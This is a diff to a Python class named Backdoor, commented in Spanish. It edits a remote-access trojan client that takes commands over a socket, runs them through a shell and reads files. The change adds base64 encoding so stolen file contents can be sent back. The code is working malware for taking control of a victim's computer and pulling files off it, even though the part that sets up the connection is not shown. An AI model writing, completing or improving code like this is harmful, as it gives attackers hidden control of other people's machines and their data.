@@ -1,3 +1,4 @@
+import base64
 import socket
 import subprocess
 import json
@@ -20,21 +21,20 @@ class Backdoor:
     #Decodificación json:
     def reliableRecieve(self):
         jsonData = ''
-        '''
-        Al usar un bucle, la función de recibir datos se ejecuta una y otra vez.
-        De esta manera nos aseguramos de que todos los paquetes sean recividos, evitando que se pierda alguno.
-        Así aseguramos la integridad de los mismos.
-        '''
         while True:
+        #Al usar un bucle, la función de recibir datos se ejecuta una y otra vez.
+        #De esta manera nos aseguramos de que todos los paquetes sean recividos, evitando que se pierda alguno.
+        #Así aseguramos la integridad de los mismos
             try:
                 jsonData = self.connection.recv(1024)
                 return json.loads(jsonData.decode('utf-8'))
-            
+
             except ValueError: continue
     
     def runCommand(self, command):
         try:
             return subprocess.check_output(command, shell=True)
+            
         except subprocess.CalledProcessError:
             return '[-] Comado no reconocido o error en el valor de salida'
 
@@ -46,14 +46,15 @@ class Backdoor:
         except (FileNotFoundError, OSError): 
             return '[-] El sistema no puede encontrar la ruta especificada'
     
+    
     def readFile(self, path):
         with open(path, 'rb') as file:
-            return file.read()
+            return base64.b64encode(file.read())
     
     def run(self):
         try:
             while True: #Permite al programa ejecutarse indefinidamente
-                command = self.reliableRecieve() #Recibe toda la información que le enviemos(En este caso, comandos de consola)
+                command = self.reliableRecieve() #Recibe toda la información que le enviemos
                 if command[0] == 'salir':
                     self.connection.close()
                     exit()
